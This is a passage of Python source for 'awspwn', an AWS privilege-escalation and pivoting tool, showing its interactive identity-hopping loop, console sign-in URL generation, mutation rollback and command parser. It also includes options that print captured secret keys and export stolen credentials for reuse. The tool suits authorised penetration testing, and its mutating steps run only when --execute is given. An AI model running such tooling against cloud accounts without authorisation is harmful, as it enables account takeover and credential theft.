                       loot_dir=args.loot_dir, session_name=getattr(args, "session_name", "awspwn"))

    while True:
        node = graph.nodes.get(current_node_id)
        label = node.label if node else current_node_id
        live = f"  {_dim('creds:')} {current.identity.arn}" if current is not None else ""
        print(f"\n  {_bold('at')} {label}  {_dim('(' + current_node_id + ')')}{live}")

        all_hops = _roam_hops(graph, current_node_id)
        # A completed MUTATING hop is not offered again (it would just re-run an
        # already-applied escalation); it is shown as done for context.
        hops, done = [], []
        for e, dst, info in all_hops:
            key = (current_node_id, e.kind, dst.object_id)
            (done if key in completed else hops).append((e, dst, info))

        if not hops:
            print(_dim("  no onward abusable hops from here."))
        for i, (e, dst, info) in enumerate(hops, 1):
            tag = _color(info.blast_radius.value, _ROAM_BLAST.get(info.blast_radius, C.WHITE))
            marks = ""
            if dst.properties.get("synthetic_goal") or graph.is_high_value(dst):
                marks += " " + _color("★", C.YELLOW)
            if dst.object_id in reached:
                marks += " " + _color("[reached]", C.GREEN)
            if dst.object_id in visited:
                marks += " " + _dim("[visited]")
            print(f"    {_color(str(i), C.CYAN)}. {_color(e.kind, C.CYAN)} → {_bold(dst.label)}  [{tag}]{marks}")
        for e, dst, _info in done:
            print(_dim(f"    ·  {e.kind} → {dst.label}  [done]"))

        recron = "recollect [r] / " if (gates.execute and current is not None) else ""
        try:
            sel = input(f"  hop [1-{len(hops)}] / {recron}quit [q]: ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if sel.lower() == "q" or not sel:
            break
        if sel.lower() == "r":
            # Manual re-recon: pick up same-identity permission mutations or
            # external policy changes without needing an identity hop.
            if gates.execute and current is not None:
                print(_dim("  re-collecting the current vantage…"))
                collect_from(current, state, graph, args, phase2=phase2)
            else:
                print(_dim("  recollect needs --execute (and live credentials)."))
            continue
        try:
            edge, dst, info = hops[int(sel) - 1]
        except (ValueError, IndexError):
            print(f"  {_color('[!]', C.RED)} invalid selection")
            continue

        src_node = graph.nodes.get(current_node_id) or source
        one_hop = AttackPath(nodes=[src_node, dst], edges=[edge])

        # Plan-only: preview the single hop; explicitly do NOT claim a pivot.
        if not gates.execute:
            print()
            print(render_plan(one_hop, gates))
            print(_dim("  # plan mode - nothing executed, no pivot. Re-run with --execute."))
            continue

        report = engine.walk(one_hop, current)
        for ln in report.loot[:8]:
            print(f"    {_color('loot:', C.MAGENTA)} {ln}")
        for b in report.blocked:
            print(f"    {_color('blocked:', C.YELLOW)} {b}")
        for m in report.manual:
            print(f"    {_color('manual:', C.YELLOW)} {m}")

        if report.hops_done < 1:
            print(_dim("  hop did not complete - staying put."))
            continue
        hop_count += 1
        if info.blast_radius.value != "READ":
            completed.add((current_node_id, edge.kind, dst.object_id))

        # Checkpoint from the DESTINATION node, not WalkReport.reached_goal
        # (which is true whenever a hop completes). Reaching admin is announced,
        # then the loop continues.
        if dst.properties.get("synthetic_goal") or graph.is_high_value(dst):
            reached.add(dst.object_id)
            print(f"  {_color('[★] REACHED', C.YELLOW)} {_bold(dst.label)}")

        # New credentials != necessarily a new identity (a secret can yield
        # replacement creds for the SAME principal). Accept valid new creds
        # always; recollect only when the graph PRINCIPAL id actually changes.
        if engine.final_client is not current:
            new_client = engine.final_client
            # The chosen edge target is authoritative when it is a principal;
            # otherwise resolve the new identity (path-qualified) from its creds.
            new_id = dst.object_id if dst.is_principal else _canonical_caller(new_client)
            current = new_client
            if new_id != current_node_id:
                current_node_id = new_id
                print(f"  {_color('[+]', C.GREEN)} now: {_bold(current.identity.arn)}  "
                      f"{_dim('(graph id ' + current_node_id + ')')}")
                if current_node_id not in visited:
                    print(_dim("  re-collecting from the new vantage…"))
                    collect_from(current, state, graph, args, phase2=phase2)
                    visited.add(current_node_id)
            else:
                print(_dim("  replacement credentials for the same principal - not re-collecting."))
        else:
            print(_dim("  resource hop - identity unchanged, not re-collecting."))

    print()
    print(separator())
    print(f"  {_bold('roam ended')}: {hop_count} hop(s), {len(visited)} identity(ies) visited, "
          f"{len(reached)} checkpoint(s) reached")
    if gates.execute and state.mutations:
        print(f"  {_bold('Mutations recorded')}: {engine.mutation_count}  "
              f"({_color('awspwn rollback', C.CYAN)} to undo)")
    return 0


def cmd_console(args: argparse.Namespace) -> int:
    from .aws_client import connect
    from .console import ConsoleError, signin_url

    _banner_once(args, "convert CLI credentials into a console sign-in URL")
    client = connect(args)
    print(f"  {_color('[+]', C.GREEN)} federating {_bold(client.identity.arn)}")
    try:
        result = signin_url(
            client,
            destination=getattr(args, "destination", None) or "https://console.aws.amazon.com/",
            duration=getattr(args, "duration", 3600),
        )
    except ConsoleError as exc:
        print(f"  {_color('[!]', C.RED)} {exc}")
        return 1
    print(f"  {_color('[*]', C.CYAN)} source: {result.source}")
    if result.note:
        print(_dim(f"  {result.note}"))
    print()
    print(_bold("  Console sign-in URL (valid ~15 min):"))
    print(f"  {_color(result.url, C.GREEN)}")
    return 0


def cmd_rollback(args: argparse.Namespace) -> int:
    from .aws_client import connect
    from .rollback import rollback as do_rollback

    _banner_once(args, "replay the mutation ledger to undo changes")
    state = load_state(args.loot_dir)
    if not state.mutations:
        print(f"  {_color('[!]', C.YELLOW)} No mutation ledger at {state_path(args.loot_dir)} - nothing to undo.")
        return 0

    pending = [m for m in state.mutations if not m.reverted]
    print(f"  {_bold('Mutation ledger')}: {len(state.mutations)} total, {len(pending)} pending")
    for m in state.mutations:
        mark = _color("reverted", C.GREEN) if m.reverted else _color("LIVE", C.RED)
        print(f"    [{mark}] {m.api}  ({m.blast_radius})  → undo {m.undo_api or '(none)'}")
    if not pending:
        print(f"  {_color('[+]', C.GREEN)} all mutations already reverted.")
        return 0
    print()

    if not getattr(args, "dry_run", False) and not getattr(args, "yes", False):
        try:
            r = input(f"  Revert {len(pending)} mutation(s)? (y/N): ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            return 130
        if r != "y":
            print(_dim("  aborted."))
            return 0

    dry = getattr(args, "dry_run", False)
    client = None if dry else connect(args)  # --dry-run is a fully offline preview
    report = do_rollback(state, client, args.loot_dir,
                         log=lambda msg: print(msg), dry_run=dry)
    print()
    print(f"  {_bold('Rollback')}: {len(report.reverted)} reverted, {len(report.failed)} failed")
    for m, err in report.failed:
        print(f"    {_color('[fail]', C.RED)} {m.api} → {m.undo_api}: {err}")
    return 0 if report.ok else 1


def cmd_stub(name: str, phase: str):
    def _handler(args: argparse.Namespace) -> int:
        print(f"  {_color('[!]', C.YELLOW)} `awspwn {name}` is designed but not yet implemented "
              f"(arrives in {phase}). See the plan / README for the intended behaviour.")
        return 2
    return _handler


# ─── Parser ─────────────────────────────────────────────────────────────────


def build_parser() -> argparse.ArgumentParser:
    epilog = (
        "examples:\n"
        "  awspwn enum --profile dev\n"
        "  awspwn analyze --profile dev\n"
        "  awspwn path --data awspwn-loot/graph.json 'arn:aws:iam::111:user/dev' admin --all-paths\n"
        "  awspwn reachable 'arn:aws:iam::111:user/dev'\n"
        "  awspwn info CreateAccessKey\n"
        "  awspwn edges\n"
    )
    parser = argparse.ArgumentParser(
        prog="awspwn",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="AWS attack-path automation - enumerate IAM/resources into a graph, "
                    "find privesc & lateral paths, (phase 3) auto-exploit with credential propagation.",
        epilog=epilog,
    )
    parser.add_argument("--version", action="version", version=f"awspwn {__version__}")
    sub = parser.add_subparsers(dest="command", metavar="COMMAND")
    auth = _auth_parent()

    p_enum = sub.add_parser("enum", parents=[auth], help="Enumerate identities + resources into an attack graph")
    p_enum.add_argument("--iam-only", action="store_true", help="Enumerate IAM/STS only (skip resource services)")
    p_enum.set_defaults(func=cmd_enum)

    p_analyze = sub.add_parser("analyze", parents=[auth], help="Enumerate, then discover paths from caller to admin")
    p_analyze.add_argument("--iam-only", action="store_true", help="IAM/STS only")
    p_analyze.set_defaults(func=cmd_analyze)

    p_whoami = sub.add_parser("whoami", parents=[auth], help="Resolve and print the current caller identity")
    p_whoami.set_defaults(func=cmd_whoami)

    p_load = sub.add_parser("load", parents=[auth], help="Load a graph.json and print stats + high-value targets")
    p_load.set_defaults(func=cmd_load)

    p_path = sub.add_parser("path", parents=[auth], help="Find attack path(s) between two nodes")
    p_path.add_argument("source", help="Source ARN / name (try 'me' or your user)")
    p_path.add_argument("target", help="Target ARN / name (try 'admin')")
    p_path.add_argument("--all-paths", action="store_true", help="Enumerate all paths, not just the cheapest")
    p_path.add_argument("--max-paths", type=int, default=10, help="Cap for --all-paths (default: 10)")
    p_path.set_defaults(func=cmd_path)

    p_reach = sub.add_parser("reachable", parents=[auth], help="BFS reachability map from a source node")
    p_reach.add_argument("source", help="Source ARN / name")
    p_reach.set_defaults(func=cmd_reachable)

    p_info = sub.add_parser("info", parents=[auth], help="Show abuse details for an edge type")
    p_info.add_argument("edge", help="Edge kind, e.g. CreateAccessKey")
    p_info.set_defaults(func=cmd_info)

    p_edges = sub.add_parser("edges", parents=[auth], help="List all abusable edge types by category")
    p_edges.set_defaults(func=cmd_edges)

    p_loot = sub.add_parser("loot", parents=[auth], help="Summarize state.json + captured credentials")
    p_loot.add_argument("--show-secrets", action="store_true",
                        help="Print captured secret keys / session tokens (they live 0600 in the loot store)")
    p_loot.add_argument("--export", nargs="?", const="", metavar="NAME",
                        help='Emit eval-able `export AWS_*` lines for one captured credential '
                             '(select by name/ARN/kind substring). Use: eval "$(awspwn loot --export NAME)"')
    p_loot.set_defaults(func=cmd_loot)

    p_report = sub.add_parser("report", parents=[auth], help="Render a report from saved state")
    p_report.add_argument("--format", choices=("terminal", "json"), default="terminal")
    p_report.add_argument("-o", "--output", help="Write JSON to a file (with --format json)")
    p_report.set_defaults(func=cmd_report)

    p_exploit = sub.add_parser("exploit", parents=[auth],
                               help="Choose a path and print/walk its command runbook")
    p_exploit.add_argument("source", nargs="?", help="Source ARN/name (default: the caller in the graph)")
    p_exploit.add_argument("target", nargs="?", help="Target ARN/name (default: admin + high-value targets)")
    p_exploit.add_argument("--execute", action="store_true",
                           help="Walk identity hops via boto3 and prompt before each mutating step")
    p_exploit.add_argument("-y", "--yes", dest="yes", action="store_true",
                           help="Auto-pick the cheapest path and auto-confirm READ steps")
    p_exploit.set_defaults(func=cmd_exploit)

    # ── Phase-3 exploitation commands ──
    p_pwn = sub.add_parser("pwn", parents=[auth],
                           help="Automated exploitation with credential propagation + rollback ledger")
    p_pwn.add_argument("source", nargs="?", help="Source ARN/name (default: the caller in the graph)")
    p_pwn.add_argument("target", nargs="?", help="Target ARN/name (default: admin + high-value targets)")
    p_pwn.add_argument("--execute", action="store_true",
                       help="Actually run mutating steps in-process (default: plan only - nothing is changed)")
    p_pwn.add_argument("--allow-destructive", action="store_true",
                       help="Permit DESTRUCTIVE steps (overwrites/deletes the account needs)")
    p_pwn.add_argument("--allow-external", action="store_true",
                       help="Permit EXTERNAL_EXPOSURE steps (grants access outside the account)")
    p_pwn.add_argument("--allow-orphan", action="store_true",
                       help="Permit mutating steps whose undo cannot be recorded on the ledger")
    p_pwn.add_argument("--rollback-on-failure", action="store_true",
                       help="If the goal is not reached, replay the ledger to undo what ran")
    p_pwn.add_argument("--cleanup", action="store_true",
                       help="After the walk, roll back the mutation ledger using the gained "
                            "(elevated) identity - removes artifacts the caller alone cannot delete")
    p_pwn.add_argument("--session-name", default="awspwn", help="RoleSessionName for assume-role hops")
    p_pwn.add_argument("-y", "--yes", dest="yes", action="store_true",
                       help="Auto-pick the cheapest path (no interactive selection)")
    p_pwn.set_defaults(func=cmd_pwn)

    p_roam = sub.add_parser("roam", parents=[auth],
                            help="Interactive pivot loop - hop identity to identity, re-collecting each vantage")
    p_roam.add_argument("source", nargs="?", help="Start node ARN/name (default: the caller in the graph)")
    p_roam.add_argument("--execute", action="store_true",
                        help="Actually walk hops (default: plan only - preview each hop, no pivot)")
    p_roam.add_argument("--allow-destructive", action="store_true", help="Permit DESTRUCTIVE hops")
    p_roam.add_argument("--allow-external", action="store_true", help="Permit EXTERNAL_EXPOSURE hops")
    p_roam.add_argument("--allow-orphan", action="store_true",
                        help="Permit mutating hops whose undo cannot be recorded")
    p_roam.add_argument("--iam-only", action="store_true",
                        help="Re-collect IAM/STS only after a pivot (skip resource services)")
    p_roam.add_argument("--session-name", default="awspwn", help="RoleSessionName for assume-role hops")
    p_roam.set_defaults(func=cmd_roam)

    p_console = sub.add_parser("console", parents=[auth],
                               help="Convert CLI creds into a console sign-in URL")
    p_console.add_argument("--destination", default="https://console.aws.amazon.com/",
                           help="Console page to land on after sign-in")
    p_console.add_argument("--duration", type=int, default=3600,
                           help="Federation session duration in seconds (default: 3600)")
    p_console.set_defaults(func=cmd_console)

    p_rollback = sub.add_parser("rollback", parents=[auth],
                                help="Replay the mutation ledger to undo a pwn run")
    p_rollback.add_argument("--dry-run", action="store_true", help="Show what would be undone without calling AWS")
    p_rollback.add_argument("-y", "--yes", dest="yes", action="store_true", help="Do not prompt before reverting")
    p_rollback.set_defaults(func=cmd_rollback)

    return parser


def main(argv: Optional[list[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    if not getattr(args, "command", None):
        parser.print_help()
        return 1

    try:
        return args.func(args)
    except KeyboardInterrupt:
        print(f"\n  {_color('[!]', C.YELLOW)} Aborted by user")
        return 130
    except Exception as exc:  # noqa: BLE001
        print(f"\n  {_color('[!]', C.RED)} Error: {exc}")
        if os.environ.get("AWSPWN_DEBUG"):
            import traceback
            traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())
